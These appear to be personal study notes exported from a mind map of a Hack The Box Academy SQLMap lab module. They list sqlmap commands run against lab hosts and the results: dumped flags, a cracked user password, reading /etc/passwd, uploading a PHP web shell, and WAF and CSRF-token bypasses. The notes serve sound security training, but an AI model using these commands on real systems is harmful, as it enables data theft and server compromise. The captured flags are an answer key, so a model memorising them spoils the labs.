---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "1"
module: "SQLMap Essentials"
output_topics: 32
---

# SQLMap Essentials — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> HTB{700_much_c0n6r475_0n_p057_r3qu357}
>
> **Source path:** SQLMap Essentials → Running SQLMap on an HTTP Request → Lab → What's the contents of table flag2? (Case #2) → Devtool &gt; Network &gt; POST &gt; Copy to cUrl → sqlmap (Pasted headers) --batch --dbs → --batch -D testdb -T flag2 --dump → HTB{700_much_c0n6r475_0n_p057_r3qu357}
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: 462c294f-bc93-40e5-b4e2-dd04e68bc36b -->

> [!output]+ 🟨 Output 002
> HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
>
> **Source path:** SQLMap Essentials → Running SQLMap on an HTTP Request → Lab → Detect and exploit SQLi vulnerability in Cookie value id=1 (Case#3) → copy as curl → sqlmap 'http://94.237.56.99:59842/case3.php'   --compressed   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Referer: http://94.237.56.99:59842/'   -H 'DNT: 1'   -H 'Connection: keep-alive'   -H 'Cookie: id=1*'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Sec-GPC: 1'   -H 'Priority: u=0, i' --batch -D testdb --tables flag3 --dump → HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ece86571-efc6-410f-9fbc-753dd5ae2172 -->

> [!output]+ 🟨 Output 003
> HTB{j450n_v00rh335_53nd5_6r475}
>
> **Source path:** SQLMap Essentials → Running SQLMap on an HTTP Request → Lab → Detect and exploit SQLi vulnerability in JSON data {"id": 1} (Case#4) → POST request → copy as curl → sqlmap 'http://94.237.56.99:59842/case4.php'   --compressed   -X POST   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'   -H 'Accept: */*'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Referer: http://94.237.56.99:59842/case4.php'   -H 'Content-Type: application/json'   -H 'Origin: http://94.237.56.99:59842'   -H 'DNT: 1'   -H 'Connection: keep-alive'   -H 'Sec-GPC: 1'   --data-raw '{"id":1}' --batch -D testdb -T flag4 --dump → HTB{j450n_v00rh335_53nd5_6r475}
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: abca028c-b5a2-4a6b-bb2e-bb32ec6a856f -->

> [!output]+ 🟨 Output 004
> Payload: id=-9574 OR 9337=9337
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag5? (Case #5) → id =1 returned user value (from DB) → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE → Payload: id=-9574 OR 9337=9337
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c29f4ce7-6c5b-4d01-bafe-a6b43961cfa2 -->

> [!output]+ 🟨 Output 005
> got } only
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag5? (Case #5) → id =1 returned user value (from DB) → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE → Payload: id=-9574 OR 9337=9337 → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch --dbs → got } only
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 05203b81-bc82-4647-8c3e-413bded57d0f -->

> [!output]+ 🟨 Output 006
> testdb
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag5? (Case #5) → id =1 returned user value (from DB) → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE → Payload: id=-9574 OR 9337=9337 → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch --dbs → got } only → fix the caching issue → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE --dbs --fresh-queries --flush-session → testdb
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b37c9fc3-77cc-4a50-a9cf-6fa6bb9ca5ff -->

> [!output]+ 🟨 Output 007
> +----+---------------------------------+
> | id | content                         |
> +----+---------------------------------+
> | @a | HTB{700_much_r15k_bu7_w0r7h_17} |
> +----+---------------------------------+
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag5? (Case #5) → id =1 returned user value (from DB) → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE → Payload: id=-9574 OR 9337=9337 → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch --dbs → sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -D testdb -T flag5 --dump --no-cast → +----+---------------------------------+ | id | content                         | +----+---------------------------------+ | @a | HTB{700_much_r15k_bu7_w0r7h_17} | +----+---------------------------------+
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7fc4981c-b19a-461a-8faa-b281308332a3 -->

> [!output]+ 🟨 Output 008
> HTB{v1nc3_mcm4h0n_15_4570n15h3d}
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag6? (Case #6) → sqlmap -u 'http://94.237.50.128:48668/case6.php?col=id' --batch -p col --level=5 --risk=3 -v 3 --technique=BUE --prefix='`)' → sqlmap -u 'http://94.237.50.128:48668/case6.php?col=id' --batch -D testdb -T flag6 --dump → HTB{v1nc3_mcm4h0n_15_4570n15h3d}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6b3cacdb-5905-4754-89d3-8a4179832439 -->

> [!output]+ 🟨 Output 009
> id	name	birthday	 occupation	phone
> 1	Maynard Rice	March 1 1958	Linemen	281-559-0172
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag7? (Case #7) → id	name	birthday	 occupation	phone 1	Maynard Rice	March 1 1958	Linemen	281-559-0172
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9b31decf-6eb6-427e-8a83-eab972f4bfd1 -->

> [!output]+ 🟨 Output 010
> HTB{un173_7h3_un173d}
>
> **Source path:** SQLMap Essentials → Attack Tuning → LAB → What's the contents of table flag7? (Case #7) → id	name	birthday	 occupation	phone 1	Maynard Rice	March 1 1958	Linemen	281-559-0172 → sqlmap -u 'http://94.237.50.128:48668/case7.php?id=1' -p id --batch --level=5 --risk=3 --technique=U -v 3 --union-cols=5 → sqlmap -u 'http://94.237.50.128:48668/case7.php?id=1' --batch -D testdb -T flag7 --dump → HTB{un173_7h3_un173d}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 765b4ca9-fc38-4dab-8e88-f4c348af013d -->

> [!output]+ 🟨 Output 011
> web application technology: PHP 5.2.6, Apache 2.2.9
>
> **Source path:** SQLMap Essentials → Database Enumeration → Basic DB Data Enumeration → sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba → web application technology: PHP 5.2.6, Apache 2.2.9
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d4d50d23-de80-4aae-9afd-f4353ddfa6f5 -->

> [!output]+ 🟨 Output 012
> current user: 'root@%'
>
> **Source path:** SQLMap Essentials → Database Enumeration → Basic DB Data Enumeration → sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba → current user: 'root@%'
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3af3847e-9957-4b1c-91fc-b3ae7962ab65 -->

> [!output]+ 🟨 Output 013
> current database: 'testdb'
>
> **Source path:** SQLMap Essentials → Database Enumeration → Basic DB Data Enumeration → sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba → current database: 'testdb'
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 93527af6-d30a-46fd-8b88-eb214287295e -->

> [!output]+ 🟨 Output 014
> current user is DBA: True
>
> **Source path:** SQLMap Essentials → Database Enumeration → Basic DB Data Enumeration → sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba → current user is DBA: True
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a62b5d5e-df59-437d-b55e-917f40b9dc85 -->

> [!output]+ 🟨 Output 015
> do you want to crack them via a dictionary-based attack? [Y/n/q] Y
>
> **Source path:** SQLMap Essentials → Advanced Database Enumeration → Password Enumeration and Cracking → sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users → do you want to crack them via a dictionary-based attack? [Y/n/q] Y
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: 0cc0c9aa-fd70-4b05-86c9-230667635a68 -->

> [!output]+ 🟨 Output 016
> clear-text password: testpass
>
> **Source path:** SQLMap Essentials → Advanced Database Enumeration → Password Enumeration and Cracking → sqlmap -u "http://www.example.com/?id=1" --passwords --batch → clear-text password: testpass
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: 2552ebb8-a7c8-4908-9688-0b14e19cbb33 -->

> [!output]+ 🟨 Output 017
> PARAMETER_STYLE
>
> **Source path:** SQLMap Essentials → Advanced Database Enumeration → LAB → What's the name of the column containing "style" in it's name? (Case #1) → sqlmap -u http://94.237.63.176:36637/case1.php?id=1 --search -C 'style' → PARAMETER_STYLE
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: 90c723e1-d31a-49ee-b4e8-616bce34d5e3 -->

> [!output]+ 🟨 Output 018
> do you want to crack them via a dictionary-based attack? [Y/n/q] Y
>
> **Source path:** SQLMap Essentials → Advanced Database Enumeration → LAB → What's the Kimberly user's password? (Case #1) → sqlmap -u 'http://94.237.63.176:55957/case1.php?id=1' -D testdb -T users -C name,password --dump → do you want to crack them via a dictionary-based attack? [Y/n/q] Y
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: e0003ec8-5e74-4937-ab87-7fd7d9651af4 -->

> [!output]+ 🟨 Output 019
> Kimberly Wright   | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)
>
> **Source path:** SQLMap Essentials → Advanced Database Enumeration → LAB → What's the Kimberly user's password? (Case #1) → sqlmap -u 'http://94.237.63.176:55957/case1.php?id=1' -D testdb -T users -C name,password --dump → do you want to crack them via a dictionary-based attack? [Y/n/q] Y → default answers → Kimberly Wright   | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: ea47273c-0807-4c6d-ab75-e73a714b8c23 -->

> [!output]+ 🟨 Output 020
> uri: http://www.example.com:80/?id=1&amp;rp=99954
> URI:%20http://www.example.com:80/?id=1&amp;rp=87216URI:%20http://www.example.com:80/?id=9030&amp;rp=36456
> URI:%20http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689
> URI:%20http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049
> URI:%20http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185
>
> **Source path:** SQLMap Essentials → Bypassing Web Application Protections → Unique Value Bypass → --randomize → ensuring that each request has a unique value for a predefined parameter → sqlmap -u "http://www.example.com/?id=1&amp;rp=29125" --randomize=rp --batch -v 5 | grep URI → uri: http://www.example.com:80/?id=1&amp;rp=99954 URI:%20http://www.example.com:80/?id=1&amp;rp=87216URI:%20http://www.example.com:80/?id=9030&amp;rp=36456 URI:%20http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689 URI:%20http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049 URI:%20http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185
> **XMind color:** `#FDD834FF`
<!-- xmind-output-id: 4c146a4b-eeee-4818-9e12-4e4fd78b33e9 -->

> [!output]+ 🟨 Output 021
> HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
>
> **Source path:** SQLMap Essentials → Bypassing Web Application Protections → LAB → What's the contents of table flag8? (Case #8) → anti-CSRF token bypass → copy the POST message as curl → sqlmap -u 'http://94.237.61.52:31681/case8.php' \   --compressed \   -X POST \   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \   --data-raw 'id=1&amp;t0ken=TywHpLRHl4MhhR2LeyHqOU15pldq58ygWjgIhuBw0' --batch --csrf-token="t0ken" -p id → sqlmap -u 'http://94.237.61.52:31681/case8.php' \   --compressed \   -X POST \   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \   --data-raw 'id=1&amp;t0ken=TywHpLRHl4MhhR2LeyHqOU15pldq58ygWjgIhuBw0' --batch --csrf-token="t0ken" -p id -D testdb -T flag8 --dump → HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fd9b21f6-08ef-40cc-ad9f-94323ffc781e -->

> [!output]+ 🟨 Output 022
> HTB{700_much_r4nd0mn355_f0r_my_74573}
>
> **Source path:** SQLMap Essentials → Bypassing Web Application Protections → LAB → What's the contents of table flag9? (Case #9) → Unique ID → sqlmap -u 'http://94.237.61.52:31681/case9.php?id=1&amp;uid=3097251142' --batch -p id  --randomize=uid → sqlmap -u 'http://94.237.61.52:31681/case9.php?id=1&amp;uid=3097251142' --batch --randomize=uid -D testdb -T flag9 --dump → HTB{700_much_r4nd0mn355_f0r_my_74573}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: beec159f-7ad5-4f61-a6ba-dc8c834a9c22 -->

> [!output]+ 🟨 Output 023
> HTB{y37_4n07h3r_r4nd0m1z3}
>
> **Source path:** SQLMap Essentials → Bypassing Web Application Protections → LAB → What's the contents of table flag10? (Case #10) → Primitive protection → copy the POST message as curl → sqlmap -u 'http://94.237.61.52:31681/case10.php' \   --compressed \   -X POST \   ...   -H 'Priority: u=0, i' \   --data-raw 'id=1' --batch --skip-waf -D testdb -T flag10 --dump → HTB{y37_4n07h3r_r4nd0m1z3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 68002583-ad79-402e-8768-729d03ae4fc7 -->

> [!output]+ 🟨 Output 024
> HTB{5p3c14l_ch4r5_n0_m0r3}
>
> **Source path:** SQLMap Essentials → Bypassing Web Application Protections → LAB → What's the contents of table flag11? (Case #11) → Filtering of characters '&lt;', '&gt;' → sqlmap -u 'http://94.237.61.52:31681/case11.php?id=1' --batch --tamper=between,randomcase --batch -D testdb -T flag11 --dump → HTB{5p3c14l_ch4r5_n0_m0r3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9ce3bc3e-f4d1-42a6-8a31-479d370f1ab7 -->

> [!output]+ 🟨 Output 025
> current user is DBA: False
>
> **Source path:** SQLMap Essentials → OS Exploitation → Checking for DBA Privileges → sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba → current user is DBA: False
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 26c6ee9a-7e98-4fe3-b7e8-7916edb6d617 -->

> [!output]+ 🟨 Output 026
> current user is DBA: True
>
> **Source path:** SQLMap Essentials → OS Exploitation → Checking for DBA Privileges → sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba → current user is DBA: True
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b90f59a5-1568-48e1-a9d4-1ae75341d48d -->

> [!output]+ 🟨 Output 027
> the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd'
>
> **Source path:** SQLMap Essentials → OS Exploitation → Reading Local Files → sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd" → the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd'
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 31bd5ce9-6989-4ffe-b44b-6d494b7c35d0 -->

> [!output]+ 🟨 Output 028
> the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
>
> **Source path:** SQLMap Essentials → OS Exploitation → Writing Local Files → let's prepare a basic PHP web shell → sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" → the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d1ef41d2-ec24-438a-b729-265ce56542f9 -->

> [!output]+ 🟨 Output 029
> os-shell&gt; ls -la
>
> **Source path:** SQLMap Essentials → OS Exploitation → OS Command Execution → xp_cmdshell → --os-shell → sqlmap -u "http://www.example.com/?id=1" --os-shell → os-shell&gt; ls -la
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ecb2462f-72d1-4d7a-ba85-f6c595bf9f8d -->

> [!output]+ 🟨 Output 030
> [WARNING] something went wrong with full UNION technique
>
> **Source path:** SQLMap Essentials → OS Exploitation → OS Command Execution → xp_cmdshell → --os-shell → sqlmap -u "http://www.example.com/?id=1" --os-shell → os-shell&gt; ls -la → [WARNING] something went wrong with full UNION technique
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d55ad798-cbd9-45bf-97dd-5dca12e43f54 -->

> [!output]+ 🟨 Output 031
> [*] information_schema
> [*] production
>
> **Source path:** SQLMap Essentials → Skills Assessment → What's the contents of table final_flag? → run Developer tool and look for attacking vector → foumd POST request → sqlmap -u 'http://94.237.121.111:53296/action.php' \   -X POST \   ...   --data-raw '{"id":1}' --batch → sqlmap -u 'http://94.237.121.111:53296/action.php'   -X POST  ...   --data-raw '{"id":1}' --batch --skip-waf --no-cast --random-agent --chunked --tamper=between,randomcase --dbs → [*] information_schema [*] production
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a8d39a71-a1ee-47c6-a365-ef7837453102 -->

> [!output]+ 🟨 Output 032
> HTB{n07_50_h4rd_r16h7?!}
>
> **Source path:** SQLMap Essentials → Skills Assessment → What's the contents of table final_flag? → run Developer tool and look for attacking vector → foumd POST request → sqlmap -u 'http://94.237.121.111:53296/action.php' \   -X POST \   ...   --data-raw '{"id":1}' --batch → sqlmap -u 'http://94.237.121.111:53296/action.php'   -X POST  ...   --data-raw '{"id":1}' --batch --skip-waf --no-cast --random-agent --chunked --tamper=between,randomcase --dbs → [*] information_schema [*] production → -D production -T final_flag --dump → HTB{n07_50_h4rd_r16h7?!}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d41ccdf8-e0df-4d69-b4aa-d56ecf0d76ab -->
